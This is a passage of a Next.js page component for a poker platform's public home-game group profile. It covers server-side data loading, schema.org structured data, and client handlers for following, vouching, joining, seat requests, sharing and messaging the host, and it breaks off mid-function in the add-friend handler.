/**
 * ══════════════════════════════════════════════════════════════════════════
 *  UNIFIED PUBLIC HOME GAME PAGE — SSR edition (Phase 2)
 *  /hub/home-games/[slug]
 * ══════════════════════════════════════════════════════════════════════════
 *
 *  Phase 2 upgrade over the Phase 1 client-fetched version:
 *    - getServerSideProps loads data server-side so crawlers + first paint
 *      both get the full group profile, cover image, upcoming games.
 *    - JSON-LD structured data: LocalBusiness for the host + Event for each
 *      upcoming game. Real SEO signal for each group.
 *    - og:image resolves to the group's cover (or avatar) so shares on
 *      social media carry a proper card.
 *    - 404 is a real HTTP 404 (not a client-rendered "Not found" page)
 *      so search engines drop dead links correctly.
 */

import React, { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/router';
import Link from 'next/link';
import Head from 'next/head';
import SEOHead from '../../../src/components/seo/SEOHead';
import UniversalHeader from '../../../src/components/ui/UniversalHeader';
import HamburgerMenu from '../../../src/components/ui/HamburgerMenu';
import useTrainingBus from '../../../src/hooks/useTrainingBus';
import { supabase } from '../../../src/lib/supabase';
import { getAccessToken, getSafeUser } from '../../../src/lib/authUtils';
import HomeGamesSeatReservation from '../../../src/components/home-games/HomeGamesSeatReservation';
import TournamentList from '../../../src/components/home-games/TournamentList';
import { safeCopyToClipboard } from '../../../src/lib/clipboard';
import { toast } from '../../../src/stores/toastStore';

const GAME_TYPE_LABELS = {
  nlh: "No-Limit Hold'em",
  nlhe: "No-Limit Hold'em",
  plo: 'Pot-Limit Omaha',
  plo4: 'PLO',
  plo5: '5-Card PLO',
  plo8: 'PLO Hi-Lo',
  mixed: 'Mixed Games',
  limit: "Limit Hold'em",
  short_deck: 'Short Deck',
};

const FREQUENCY_LABELS = {
  weekly: 'Weekly',
  biweekly: 'Every 2 Weeks',
  monthly: 'Monthly',
  irregular: 'Irregular',
  daily: 'Daily',
};

const SITE_URL = 'https://smarter.poker';

// ── Server-side data fetch ─────────────────────────────────────────────────
// Called on every request. Short-cache so a new post or RSVP shows up fast,
// but long-enough-SWR that crawler bursts don't hammer the DB.
export async function getServerSideProps({ params, res, req }) {
  const slug = params?.slug;
  if (!slug || typeof slug !== 'string') {
    return { notFound: true };
  }

  // Resolve absolute API URL from the request headers for same-host fetch.
  const rawHost = req.headers['x-forwarded-host'] || req.headers.host || '';
  const host = String(rawHost).split(',')[0].trim();
  const rawProto = req.headers['x-forwarded-proto'] || 'https';
  const proto = String(rawProto).split(',')[0].trim();
  const base = host ? `${proto}://${host}` : SITE_URL;

  // Forward the visitor's originating IP to the API.
  //
  // The handler calls applyRateLimit(req, res, LIMITS.read), and
  // src/lib/apiRateLimit.js keys its bucket on x-real-ip, then the rightmost
  // x-forwarded-for value, then socket.remoteAddress. This SSR fetch carries
  // none of the visitor's headers, so without this every SSR render for every
  // visitor collapsed into a single shared bucket per lambda instance — one
  // crawler burst tripped it and real users started getting error pages.
  // Passing the client IP through gives each visitor their own bucket again.
  const clientIp = String(req.headers['x-real-ip'] || '').split(',')[0].trim();
  const fwdFor = String(req.headers['x-forwarded-for'] || '').trim();
  const ssrHeaders = { 'User-Agent': 'sp-ssr' };
  if (clientIp) ssrHeaders['x-real-ip'] = clientIp;
  if (fwdFor) ssrHeaders['x-forwarded-for'] = fwdFor;
  else if (clientIp) ssrHeaders['x-forwarded-for'] = clientIp;

  try {
    const apiRes = await fetch(`${base}/api/public/home-games/${encodeURIComponent(slug)}`, {
      headers: ssrHeaders,
    });

    if (apiRes.status === 404) {
      return { notFound: true };
    }
    if (!apiRes.ok) {
      // Upstream is throttled or broken — 503 + Retry-After, not 500. A 500
      // tells a crawler the URL itself is broken and it gets dropped from the
      // index; a 503 is the "come back shortly" signal this actually is.
      res.statusCode = apiRes.status === 429 ? 503 : 500;
      if (apiRes.status === 429) res.setHeader('Retry-After', '60');
      return { props: { data: null, serverError: true } };
    }

    const json = await apiRes.json();
    if (!json?.success || !json?.data) {
      return { notFound: true };
    }

    // Cache at the edge for 30s fresh / 180s stale-while-revalidate.
    res.setHeader('Cache-Control', 'public, s-maxage=30, stale-while-revalidate=180');

    return { props: { data: json.data, serverError: false } };
  } catch (err) {
    console.warn('[App] Handled exception:', err?.message || err);
    res.statusCode = 500;
    return { props: { data: null, serverError: true } };
  }
}

function formatStakesLine(group) {
  const type = GAME_TYPE_LABELS[group.default_game_type] || group.default_game_type?.toUpperCase() || 'Poker';
  const stakes = group.default_stakes ? ` ${group.default_stakes}` : '';
  return `${type}${stakes}`;
}

function formatSchedule(group) {
  const freq = FREQUENCY_LABELS[group.frequency] || group.frequency;
  if (!freq) return null;
  if (group.typical_day) return `${freq} · ${group.typical_day}`;
  return freq;
}

function formatDate(dateStr) {
  if (!dateStr) return '';
  const d = new Date(dateStr + 'T00:00:00');
  return d.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' });
}

function formatTime(t) {
  if (!t) return '';
  const [h, m] = String(t).split(':').map(Number);
  const date = new Date();
  date.setHours(h || 0, m || 0, 0, 0);
  return date.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
}

// Build JSON-LD for crawlers. One LocalBusiness for the host, one Event per
// upcoming game. This is what powers rich-result search cards.
function buildJsonLd(data) {
  const { page, group, host, upcoming_games = [] } = data;
  const canonicalUrl = `${SITE_URL}/hub/home-games/${page.slug}`;

  const localBusiness = {
    '@context': 'https://schema.org',
    '@type': 'LocalBusiness',
    '@id': canonicalUrl,
    name: page.name,
    description: group.description || page.description || '',
    url: canonicalUrl,
    image: page.cover_url || page.avatar_url || undefined,
    address: (page.city || page.state)
      ? {
        '@type': 'PostalAddress',
        addressLocality: page.city || undefined,
        addressRegion: page.state || undefined,
        addressCountry: page.country || 'US',
      }
      : undefined,
    // NO aggregateRating. There is no review system for home groups —
    // member_count is a membership count, not a rating count, and the old
    // hardcoded ratingValue '5' published a fabricated 5-star review card for
    // every group on the platform. Google treats unsubstantiated review markup
    // as spam and issues sitewide manual actions for it. member_count is
    // factually a join count, so it is emitted as interactionStatistic
    // instead; restore aggregateRating only when real ratings exist.
    interactionStatistic: group.member_count
      ? {
        '@type': 'InteractionCounter',
        interactionType: 'https://schema.org/JoinAction',
        userInteractionCount: group.member_count,
      }
      : undefined,
  };

  const events = upcoming_games
    .filter((g) => g.scheduled_date)
    .map((g) => {
      const startIso = g.start_time
        ? `${g.scheduled_date}T${String(g.start_time).slice(0, 8)}`
        : g.scheduled_date;
      return {
        '@context': 'https://schema.org',
        '@type': 'Event',
        name: g.title || `${GAME_TYPE_LABELS[g.game_type] || g.game_type || 'Poker'} ${g.stakes || ''}`.trim(),
        description: g.description || `${page.name} — ${formatStakesLine(group)}`,
        startDate: startIso,
        eventAttendanceMode: 'https://schema.org/OfflineEventAttendanceMode',
        eventStatus: 'https://schema.org/EventScheduled',
        location: {
          '@type': 'Place',
          name: page.name,
          address: {
            '@type': 'PostalAddress',
            addressLocality: page.city || undefined,
            addressRegion: page.state || undefined,
            addressCountry: 'US',
          },
        },
        organizer: host
          ? { '@type': 'Person', name: host.display_name }
          : undefined,
        offers: g.buyin_min != null
          ? {
            '@type': 'Offer',
            price: g.buyin_min,
            priceCurrency: 'USD',
            availability: g.max_players && (g.rsvp_yes || 0) < g.max_players
              ? 'https://schema.org/InStock'
              : g.max_players
                ? 'https://schema.org/SoldOut'
                : 'https://schema.org/InStock',
            url: canonicalUrl,
          }
          : undefined,
        // Dan-fix/tournament-jsonld: tournaments get extra schema fields
        // that improve Google Rich Results eligibility for events with a
        // hard registration cap. maximumAttendeeCapacity is a recognized
        // schema.org property; remainingAttendeeCapacity is a Google
        // extension for events with a partial fill.
        maximumAttendeeCapacity: g.format === 'tournament' && g.max_players
          ? g.max_players
          : undefined,
        remainingAttendeeCapacity: g.format === 'tournament' && g.max_players
          ? Math.max(0, g.max_players - (g.rsvp_yes || 0))
          : undefined,
        // Tournaments also benefit from a more specific name pattern that
        // search engines can parse for "[buy-in] [structure] tournament"
        // intent. Falls back to the simple title for cash games.
        about: g.format === 'tournament'
          ? `Live poker tournament${g.structure ? ` (${g.structure})` : ''}${g.buyin_min != null ? ` — $${g.buyin_min} buy-in` : ''}`
          : undefined,
      };
    });

  return [localBusiness, ...events];
}

// ── Component ──────────────────────────────────────────────────────────────
export default function PublicHomeGamePage({ data, serverError }) {
  const router = useRouter();
  useTrainingBus('hub-home-games-slug');
  const [menuOpen, setMenuOpen] = useState(false);
  const [copyState, setCopyState] = useState('');
  const [shareModalOpen, setShareModalOpen] = useState(false);
  const [sharePosted, setSharePosted] = useState(false);
  const initialFollowerCount = data?.page?.follower_count || 0;
  const [isFollowing, setIsFollowing] = useState(false);
  const [followerCount, setFollowerCount] = useState(initialFollowerCount);
  const [followBusy, setFollowBusy] = useState(false);
  const [followError, setFollowError] = useState('');
  // Add Friend state
  const [friendState, setFriendState] = useState('none'); // 'none' | 'pending' | 'friends'
  const [friendBusy, setFriendBusy] = useState(false);

  // Join Group State
  const [joinBusy, setJoinBusy] = useState(false);
  const [memberStatus, setMemberStatus] = useState(null); // 'none', 'active', 'pending', 'banned'

  // Vouch state
  const [hasVouched, setHasVouched] = useState(false);
  const [vouchCount, setVouchCount] = useState(0);
  const [vouchBusy, setVouchBusy] = useState(false);
  const [vouchers, setVouchers] = useState([]);
  const [vouchersModalOpen, setVouchersModalOpen] = useState(false);
  // Host Reputation (from quality_score + vitality_score)
  const [qualityScore, setQualityScore] = useState(0);
  const [vitalityScore, setVitalityScore] = useState(0);

  // Seat-picker modal state (phase 41 — replaces old yes/maybe/no request-seat flow)
  const [seatEvent, setSeatEvent] = useState(null);        // event object when picker is open
  const [currentUserId, setCurrentUserId] = useState(null);

  // Non-member seat request. The live seat grid is member-gated, so visitors
  // arriving from search (the entire audience of this page) get the
  // request-a-seat flow instead of an error box with no way forward.
  const [seatRequestBusy, setSeatRequestBusy] = useState(false);
  const [seatRequestNote, setSeatRequestNote] = useState('');
  const [seatRequestResult, setSeatRequestResult] = useState(null); // { response, membership }

  // Synchronous locks to prevent rapid-fire race conditions
  const followLockRef = useRef(false);
  const vouchLockRef = useRef(false);
  const joinLockRef = useRef(false);
  const friendLockRef = useRef(false);

  // Resolve the signed-in user once on mount so the seat picker can highlight own claims
  useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        const u = await getSafeUser(supabase);
        if (!cancelled) setCurrentUserId(u?.id || null);
      } catch {
        if (!cancelled) setCurrentUserId(null);
      }
    })();
    return () => { cancelled = true; };
  }, []);

  // Fetch member status for the Join Group button
  // NOTE: group?.id comes from data?.group?.id — safe because this
  // useEffect only runs when currentUserId is set, which happens after
  // mount, long after the data prop is validated by the serverError guard.
  const groupIdForMemberCheck = data?.group?.id;
  useEffect(() => {
    if (!currentUserId || !groupIdForMemberCheck) return;
    let cancelled = false;
    (async () => {
      try {
        // BUG-FIX: was 'commander_home_group_members' (doesn't exist).
        // Correct table is 'commander_home_members'.
        const { data: memberRow } = await supabase
          .from('commander_home_members')
          .select('status')
          .eq('group_id', groupIdForMemberCheck)
          .eq('user_id', currentUserId)
          .maybeSingle();
        if (!cancelled) {
          setMemberStatus(memberRow?.status || 'none');
        }
      } catch { /* ignore */ }
    })();
    return () => { cancelled = true; };
  }, [currentUserId, groupIdForMemberCheck]);

  // On mount (and whenever slug changes), check if the current authed user
  // is already following this home game. Silent failure for anonymous users —
  // the Follow button just shows the "follow" state and gates auth on click.
  const slugForFollow = data?.page?.slug;
  useEffect(() => {
    if (!slugForFollow) return;
    let cancelled = false;
    (async () => {
      try {
        const token = await getAccessToken();
        if (!token) return;
        const resp = await fetch(`/api/public/home-games/${slugForFollow}/follow`, {
          headers: { Authorization: `Bearer ${token}` },
        });
        if (!resp.ok) return;
        const json = await resp.json();
        if (cancelled) return;
        if (typeof json.is_following === 'boolean') setIsFollowing(json.is_following);
        if (typeof json.follower_count === 'number') setFollowerCount(json.follower_count);
      } catch {
        /* non-fatal */
      }
    })();
    return () => { cancelled = true; };
  }, [slugForFollow]);

  // Fetch vouch state + voucher list on mount
  useEffect(() => {
    if (!slugForFollow) return;
    let cancelled = false;
    (async () => {
      try {
        const token = await getAccessToken();
        const headers = token ? { Authorization: `Bearer ${token}` } : {};
        const resp = await fetch(`/api/public/home-games/${slugForFollow}/vouch`, { headers });
        if (!resp.ok) return;
        const json = await resp.json();
        if (cancelled) return;
        if (typeof json.vouch_count === 'number') setVouchCount(json.vouch_count);
        if (typeof json.has_vouched === 'boolean') setHasVouched(json.has_vouched);
        if (Array.isArray(json.vouchers)) setVouchers(json.vouchers);
        if (typeof json.quality_score === 'number') setQualityScore(json.quality_score);
        if (typeof json.vitality_score === 'number') setVitalityScore(json.vitality_score);
      } catch { /* non-fatal */ }
    })();
    return () => { cancelled = true; };
  }, [slugForFollow]);

  const handleFollowToggle = async () => {
    if (followBusy || followLockRef.current) return;
    followLockRef.current = true;
    setFollowBusy(true);
    setFollowError('');

    // EAGER STATE SYNCHRONIZATION: Update UI immediately (BFCache-safe)
    const wasFollowing = isFollowing;
    setIsFollowing(!wasFollowing);
    setFollowerCount(prev => wasFollowing ? Math.max(0, prev - 1) : prev + 1);

    try {
      const token = await getAccessToken();
      if (!token) {
        // Not signed in — rollback optimistic state and bounce to login
        setIsFollowing(wasFollowing);
        setFollowerCount(prev => wasFollowing ? prev + 1 : Math.max(0, prev - 1));
        const returnTo = typeof window !== 'undefined' ? window.location.pathname : `/hub/home-games/${slugForFollow}`;
        router.push(`/auth/login?redirect=${encodeURIComponent(returnTo)}`);
        return;
      }
      const method = wasFollowing ? 'DELETE' : 'POST';
      const resp = await fetch(`/api/public/home-games/${slugForFollow}/follow`, {
        method,
        headers: { Authorization: `Bearer ${token}` },
      });
      const json = await resp.json().catch(() => ({}));
      if (!resp.ok || !json.success) {
        throw new Error(json.error || 'Follow action failed');
      }
      // Server may have authoritative count — use it if provided
      if (typeof json.follower_count === 'number') setFollowerCount(json.follower_count);
    } catch (err) {
      console.warn('[App] Handled exception:', err?.message || err);
      toast.error('Failed to update follow status. Resyncing state...');
      // Authoritative state resynchronization
      try {
        const token = await getAccessToken();
        if (token) {
          const resp = await fetch(`/api/public/home-games/${slugForFollow}/follow`, {
            headers: { Authorization: `Bearer ${token}` },
          });
          if (resp.ok) {
            const json = await resp.json();
            if (typeof json.is_following === 'boolean') setIsFollowing(json.is_following);
            if (typeof json.follower_count === 'number') setFollowerCount(json.follower_count);
          }
        }
      } catch (e) {}
    } finally {
      setFollowBusy(false);
      followLockRef.current = false;
    }
  };

  const handleVouchToggle = async () => {
    if (vouchBusy || vouchLockRef.current) return;
    vouchLockRef.current = true;
    // Gate: must be signed in
    const token = await getAccessToken();
    if (!token) {
      const returnTo = typeof window !== 'undefined' ? window.location.pathname : `/hub/home-games/${slugForFollow}`;
      vouchLockRef.current = false;
      router.push(`/auth/login?redirect=${encodeURIComponent(returnTo)}`);
      return;
    }
    setVouchBusy(true);
    const wasVouched = hasVouched;
    // Optimistic update
    setHasVouched(!wasVouched);
    setVouchCount(prev => wasVouched ? Math.max(0, prev - 1) : prev + 1);
    try {
      const method = wasVouched ? 'DELETE' : 'POST';
      const resp = await fetch(`/api/public/home-games/${slugForFollow}/vouch`, {
        method,
        headers: { Authorization: `Bearer ${token}` },
      });
      const json = await resp.json().catch(() => ({}));
      if (!resp.ok || !json.success) throw new Error(json.error || 'Vouch action failed');
      if (typeof json.vouch_count === 'number') setVouchCount(json.vouch_count);
      // Refresh vouchers list for the modal
      const listResp = await fetch(`/api/public/home-games/${slugForFollow}/vouch`, { headers: { Authorization: `Bearer ${token}` } });
      if (listResp.ok) {
        const listJson = await listResp.json();
        if (Array.isArray(listJson.vouchers)) setVouchers(listJson.vouchers);
      }
    } catch (err) {
      console.warn('Vouch error:', err);
      toast.error('Network error. Resyncing state...');
      try {
        const listResp = await fetch(`/api/public/home-games/${slugForFollow}/vouch`, { headers: { Authorization: `Bearer ${token}` } });
        if (listResp.ok) {
          const listJson = await listResp.json();
          if (typeof listJson.has_vouched === 'boolean') setHasVouched(listJson.has_vouched);
          if (typeof listJson.vouch_count === 'number') setVouchCount(listJson.vouch_count);
          if (Array.isArray(listJson.vouchers)) setVouchers(listJson.vouchers);
        }
      } catch (e) {}
    } finally {
      setVouchBusy(false);
      vouchLockRef.current = false;
    }
  };

  // handleJoinGroup: uses data?.group via optional chain — safe before and after serverError guard.
  const handleJoinGroup = async () => {
    if (joinBusy || joinLockRef.current) return;
    joinLockRef.current = true;

    if (!currentUserId) {
      // BUG-FIX: was /login, must be /auth/login per canonical auth route
      const returnTo = typeof window !== 'undefined' ? window.location.pathname : '/';
      joinLockRef.current = false;
      router.push(`/auth/login?redirect=${encodeURIComponent(returnTo)}`);
      return;
    }

    // Validate token BEFORE setting busy so we can early-return without leaking busy state
    const token = await getAccessToken();
    if (!token) {
      const returnTo = typeof window !== 'undefined' ? window.location.pathname : '/';
      joinLockRef.current = false;
      router.push(`/auth/login?redirect=${encodeURIComponent(returnTo)}`);
      return;
    }
    // data?.group is accessed via the prop — safe with optional chaining even if data is null.
    // The Join button only renders after the serverError guard passes (line ~533), so in practice
    // this handler is only reachable when data is a valid object.
    const grp = data?.group;
    const codeToUse = grp?.club_code || grp?.invite_code || grp?.id || '';
    if (!codeToUse) {
      toast.error('Cannot join: group code unavailable.');
      joinLockRef.current = false;
      return;
    }

    setJoinBusy(true); // Set AFTER all early-returns — guaranteed to reach finally
    try {
      const res = await fetch(`/api/commander/home-games/join/${codeToUse}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`,
        },
      });

      const resData = await res.json().catch(() => ({}));
      if (!res.ok) {
        throw new Error(resData.error || 'Failed to join group');
      }

      if (resData.status === 'pending') {
        setMemberStatus('pending');
        toast.success('You Have Requested To Join This Group, You Will Be Notified By The Host When You Are Accepted');
      } else {
        setMemberStatus('active');
        toast.success('Successfully Joined Group!');
      }
    } catch (err) {
      console.warn('Join Group error:', err);
      toast.error(err.message || 'Failed to join group.');
    } finally {
      setJoinBusy(false);
      joinLockRef.current = false;
    }
  };

  // Compute Host Reputation label + color from quality + vitality
  function getReputationBadge(quality, vitality) {
    const score = (quality || 0) * 0.6 + (vitality || 0) * 8; // weighted blend
    if (score >= 80) return { label: 'Elite Host', color: '#fbbf24', bg: 'rgba(251,191,36,.12)', border: 'rgba(251,191,36,.3)' };
    if (score >= 55) return { label: 'Trusted Host', color: '#34d399', bg: 'rgba(52,211,153,.12)', border: 'rgba(52,211,153,.3)' };
    if (score >= 30) return { label: 'Active Host', color: '#22d3ee', bg: 'rgba(34,211,238,.12)', border: 'rgba(34,211,238,.3)' };
    if (score >= 10) return { label: 'New Host', color: '#94a3b8', bg: 'rgba(148,163,184,.08)', border: 'rgba(148,163,184,.2)' };
    return null; // don't show badge until there's any score
  }

  // ── Pick-a-Seat ──────────────────────────────────────────────────────────
  // Open the seat-picker overlay for a specific upcoming game. If the user
  // isn't signed in, bounce them to login with ?seatEvent=<id> in the return
  // URL so we can auto-open the picker on their way back.
  const openRequestSeat = async (gameObj) => {
    if (!gameObj || !gameObj.id) return;
    const token = await getAccessToken();
    if (!token) {
      const returnTo = typeof window !== 'undefined'
        ? `${window.location.pathname}?seatEvent=${encodeURIComponent(gameObj.id)}`
        : `/hub/home-games/${slugForFollow}?seatEvent=${encodeURIComponent(gameObj.id)}`;
      router.push(`/auth/login?redirect=${encodeURIComponent(returnTo)}`);
      return;
    }
    setSeatRequestResult(null);
    setSeatRequestNote('');
    setSeatEvent(gameObj);
  };

  const closeRequestSeat = () => {
    setSeatEvent(null);
    setSeatRequestResult(null);
    setSeatRequestNote('');
  };

  // Open the seat modal for a tournament card. TournamentList hands back its
  // own normalized record, so map it back to the original upcoming_games row
  // (which carries title / game_type / stakes for the modal header).
  const openRequestSeatForTournament = (t) => {
    if (!t?.id) return;
    const original = (data?.upcoming_games || []).find((g) => String(g.id) === String(t.id));
    openRequestSeat(original || t);
  };

  // Auto-open the seat picker after a post-login redirect. `?seatEvent=<id>`
  // in the URL means the user clicked Pick a Seat while signed out, logged
  // in, and came back. Match the id against the upcoming games list.
  //
  // BUG-FIX: this used to depend on `seatEvent` and rely on
  // window.history.replaceState() to clear the trigger. Native replaceState
  // does NOT update next/router's internal `query`, so router.query.seatEvent
  // still held the id — the moment the user closed the modal the effect
  // re-ran, saw `!seatEvent`, matched the same id and reopened it. The user
  // was trapped until a full page reload. Each id is now auto-opened at most
  // once per mount, so closing always sticks.
  const autoOpenedSeatIdsRef = useRef(new Set());
  useEffect(() => {
    const q = router?.query?.seatEvent;
    if (!q || typeof q !== 'string') return;
    if (autoOpenedSeatIdsRef.current.has(String(q))) return;
    const games = data?.upcoming_games || [];
    const match = games.find((g) => String(g.id) === String(q));
    if (!match) return;
    autoOpenedSeatIdsRef.current.add(String(q));
    setSeatEvent(match);
    // Clean the query string so a refresh doesn't re-open the modal.
    if (typeof window !== 'undefined' && window.history?.replaceState) {
      const cleanUrl = window.location.pathname;
      window.history.replaceState(null, '', cleanUrl);
    }
  }, [router?.query?.seatEvent, data?.upcoming_games]);

  // ── Add Friend status ───────────────────────────────────────────────────────
  // Check friend status on mount, then allow sending a request (handler lives
  // below, after the guard — it isn't a hook).
  //
  // HOOKS-ORDER: this MUST stay above the `serverError || !data` early return.
  // Client-side navigation between two /hub/home-games/[slug] URLs re-renders
  // the same mounted component; if one render errors and the next doesn't, a
  // hook declared below the return changes the hook count and React throws
  // "Rendered fewer hooks than expected". Read host off `data` (the prop) so
  // it doesn't depend on the destructuring that happens after the guard.
  const hostIdForFriendCheck = data?.host?.id || null;
  useEffect(() => {
    if (!hostIdForFriendCheck || !currentUserId || currentUserId === hostIdForFriendCheck) return;
    let cancelled = false;
    (async () => {
      try {
        const token = await getAccessToken();
        if (!token) return;
        const res = await fetch(`/api/friends?action=status&user_id=${hostIdForFriendCheck}`, {
          headers: { Authorization: `Bearer ${token}` },
        });
        if (!res.ok) return;
        const json = await res.json().catch(() => ({}));
        if (cancelled) return;
        if (json.status === 'friends') setFriendState('friends');
        else if (json.status === 'pending') setFriendState('pending');
        else setFriendState('none');
      } catch { /* non-fatal */ }
    })();
    return () => { cancelled = true; };
  }, [hostIdForFriendCheck, currentUserId]);

  // ── Modal accessibility ─────────────────────────────────────────────────
  // All three dialogs on this page (vouchers, share, seat picker) declare
  // role="dialog" aria-modal="true" but had no keyboard handling at all: no
  // Escape, no focus move, no focus trap, no focus restore, no scroll lock.
  // Keyboard and screen-reader users could tab straight out of a dialog that
  // claims the rest of the page is inert, and could not dismiss it.
  //
  // HOOKS-ORDER: must stay above the `serverError || !data` early return.
  const modalRef = useRef(null);
  const prevFocusRef = useRef(null);
  const closeTopModalRef = useRef(() => {});
  const isModalOpen = vouchersModalOpen || shareModalOpen || !!seatEvent;

  // Kept in a ref so the keydown listener never needs re-binding.
  closeTopModalRef.current = () => {
    if (seatEvent) { closeRequestSeat(); return; }
    if (shareModalOpen) { setShareModalOpen(false); return; }
    if (vouchersModalOpen) { setVouchersModalOpen(false); }
  };

  useEffect(() => {
    if (!isModalOpen || typeof document === 'undefined') return;

    const FOCUSABLE = 'a[href],button:not([disabled]),textarea:not([disabled]),input:not([disabled]),select:not([disabled]),[tabindex]:not([tabindex="-1"])';
    prevFocusRef.current = document.activeElement;

    const node = modalRef.current;
    if (node) {
      const first = node.querySelector(FOCUSABLE);
      try { (first || node).focus(); } catch { /* non-fatal */ }
    }

    const onKeyDown = (e) => {
      if (e.key === 'Escape') {
        e.preventDefault();
        closeTopModalRef.current();
        return;
      }
      if (e.key !== 'Tab') return;
      const n = modalRef.current;
      if (!n) return;
      const items = Array.from(n.querySelectorAll(FOCUSABLE));
      if (items.length === 0) {
        e.preventDefault();
        try { n.focus(); } catch { /* non-fatal */ }
        return;
      }
      const firstEl = items[0];
      const lastEl = items[items.length - 1];
      const active = document.activeElement;
      if (!n.contains(active)) {
        e.preventDefault();
        (e.shiftKey ? lastEl : firstEl).focus();
      } else if (e.shiftKey && active === firstEl) {
        e.preventDefault();
        lastEl.focus();
      } else if (!e.shiftKey && active === lastEl) {
        e.preventDefault();
        firstEl.focus();
      }
    };

    document.addEventListener('keydown', onKeyDown, true);
    const prevOverflow = document.body.style.overflow;
    document.body.style.overflow = 'hidden';

    return () => {
      document.removeEventListener('keydown', onKeyDown, true);
      document.body.style.overflow = prevOverflow;
      const prev = prevFocusRef.current;
      if (prev && typeof prev.focus === 'function') {
        try { prev.focus(); } catch { /* non-fatal */ }
      }
    };
  }, [isModalOpen]);

  // Server-error fallback (rare — API returned 5xx)
  if (serverError || !data) {
    return (
      <>
        <SEOHead title="Home Game — Temporarily Unavailable" description="We couldn't load this page right now." noindex={true} />
        <div className="hgs-page">
          <UniversalHeader onMenuClick={() => setMenuOpen(true)} pageDepth={2} />
          <div className="hgs-notfound">
            <h1>Temporarily Unavailable</h1>
            <p>We couldn&apos;t load this home game right now. Please try again in a moment.</p>
            {/* There is no /hub/home-games index route — near-me is the
                real discovery surface. */}
            <Link href="/hub/home-games/near-me" className="hgs-primary-btn">Browse Home Games</Link>
          </div>
          <HamburgerMenu isOpen={menuOpen} onClose={() => setMenuOpen(false)} worldKey="hub" />
          <style>{pageStyles}</style>
        </div>
      </>
    );
  }

  const { page, group, host, upcoming_games = [], posts = [] } = data;
  const canonical = `/hub/home-games/${page.slug}`;
  const shareUrl = `${SITE_URL}${canonical}`;

  const metaTitle = `${page.name} — Home Game${page.city ? ` in ${page.city}, ${page.state}` : ''}`;
  const metaDesc =
    (group.description || page.description || `Join ${page.name}, a poker home game${page.city ? ` in ${page.city}, ${page.state}` : ''}. ${formatStakesLine(group)}.`).slice(0, 160);

  const jsonLd = buildJsonLd(data);

  // bug-hunt-zero/B-SLUG-1: refactored to use the shared clipboard util.
  // The previous code awaited the promise (good) but had no execCommand
  // fallback, so non-secure / unfocused contexts always returned "Copy Failed"
  // even though the textarea-based fallback would have succeeded.
  const handleShare = () => setShareModalOpen(true);
  const copyShareUrl = async () => {
    const ok = await safeCopyToClipboard(shareUrl);
    setCopyState(ok ? 'Copied!' : 'Copy Failed');
    setTimeout(() => setCopyState(''), 2000);
  };

  const handleShareToFeed = async () => {
    const token = await getAccessToken();
    if (!token) {
      router.push('/auth/login');
      return;
    }
    try {
      // WIRING FIX: '/api/social/posts' has no handler (verified against the full repo),
      // so "Share to feed" 404'd every time and the caller's `if (res.ok)` silently
      // swallowed it. The real route is POST /api/social/create-post; link metadata
      // rides along in `metadata` since the handler has no link_* fields.
      const res = await fetch('/api/social/create-post', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({
          content: `Check out ${page.name} — a poker home game${page.city ? ` in ${page.city}, ${page.state}` : ''}! ${shareUrl}`,
          content_type: 'text',
          visibility: 'public',
          metadata: {
            post_type: 'link',
            link_url: shareUrl,
            link_title: page.name,
            link_description: metaDesc,
            link_image: page.avatar_url || page.cover_url || null,
          },
        }),
      });
      if (res.ok) {
        setSharePosted(true);
        setTimeout(() => { setSharePosted(false); setShareModalOpen(false); }, 2000);
      } else {
        // Was a silent no-op on every non-2xx (expired session, validation,
        // 5xx) — the button simply did nothing and the user kept tapping it.
        const json = await res.json().catch(() => ({}));
        toast.error(json.error || 'Could not post to your feed.');
      }
    } catch (err) {
      console.warn('Share to feed error:', err);
      toast.error('Could not post to your feed.');
    }
  };

  // ── Message Host ────────────────────────────────────────────────────────────
  // Opens a DM thread with the game host. Signed-in users go straight through;
  // anonymous visitors are bounced to login with ?redirect back here.
  const handleMessageHost = async () => {
    const hostId = host?.id;
    if (!hostId) return;
    const token = await getAccessToken();
    if (!token) {
      const returnTo = typeof window !== 'undefined' ? window.location.pathname : `/hub/home-games/${page.slug}`;
      router.push(`/auth/login?redirect=${encodeURIComponent(returnTo)}`);
      return;
    }
    // Create or find existing DM conversation, then navigate to it with draft pre-filled
    try {
      const res = await fetch('/api/messenger/start-conversation', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({ 
          otherUserId: hostId,
        }),
      });
      const json = await res.json().catch(() => ({}));
      // API returns { conversationId } (camelCase) — not conversation_id
      const convId = json.conversationId || json.conversation_id || json.id;
      if (convId) {
        router.push(`/hub/messenger?conversation=${convId}&draft=Hi!+I'm+interested+in+joining+${encodeURIComponent(page.name)}.+Can+you+tell+me+more%3F`);
      } else {
        router.push(`/hub/messenger?recipientId=${hostId}&recipientName=${encodeURIComponent(host?.display_name || 'Host')}&draft=Hi!+I'm+interested+in+joining+${encodeURIComponent(page.name)}.+Can+you+tell+me+more%3F`);
      }
    } catch {
      router.push(`/hub/messenger?recipientId=${hostId}&recipientName=${encodeURIComponent(host?.display_name || 'Host')}`);
    }
  };

  const handleAddFriend = async () => {
    if (friendBusy || friendState !== 'none' || friendLockRef.current) return;
    friendLockRef.current = true;
    const token = await getAccessToken();
    if (!token) {
      const returnTo = typeof window !== 'undefined' ? window.location.pathname : `/hub/home-games/${page.slug}`;
      friendLockRef.current = false;
      router.push(`/auth/login?redirect=${encodeURIComponent(returnTo)}`);
      return;
    }
    setFriendBusy(true);
    try {
      const res = await fetch('/api/friends', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({ action: 'send_request', to_user_id: host.id }),
      });
      const json = await res.json().catch(() => ({}));
      if (res.ok && (json.success || json.status)) {
        setFriendState('pending');
      } else if (!res.ok) {
        toast.error(json.error || 'Could not send friend request.');
      }
    } catch (err) {
      console.warn('Add friend error:', err);
      toast.error('Could not send friend request. Resyncing state...');
      try {
        const res = await fetch(`/api/friends?action=status&user_id=${host.id}`, {
          headers: { Authorization: `Bearer ${token}` },
